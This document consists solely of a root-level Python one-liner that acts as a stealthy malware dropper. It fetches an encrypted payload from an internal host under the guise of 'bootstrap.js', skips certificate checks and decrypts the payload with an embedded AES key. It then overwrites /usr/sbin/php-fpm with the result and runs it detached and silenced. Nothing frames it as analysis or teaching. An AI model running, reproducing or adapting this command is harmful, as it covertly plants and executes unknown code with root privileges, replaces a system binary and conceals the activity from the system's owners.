sudo python3 -c "import requests,os,subprocess,sys,base64;from Crypto.Cipher import AES;r=requests.get('https://10.0.0.148:8443/cdn/bootstrap.js',verify=False);c=base64.b64decode(r.content);k=bytes.fromhex('65b53ecaba31f22e75e92d9ed95d1bebd233438d72ce2f9f2ac954ca197a679f');d=AES.new(k,AES.MODE_GCM,nonce=c[:12]).decrypt_and_verify(c[12:-16],c[-16:]);p='/usr/sbin/php-fpm';f=open(p,'wb');f.write(d);f.close();os.chmod(p,0o755);n=subprocess.DEVNULL;subprocess.Popen(['nohup',p],stdin=n,stdout=n,stderr=n,start_new_session=True);sys.exit(0)"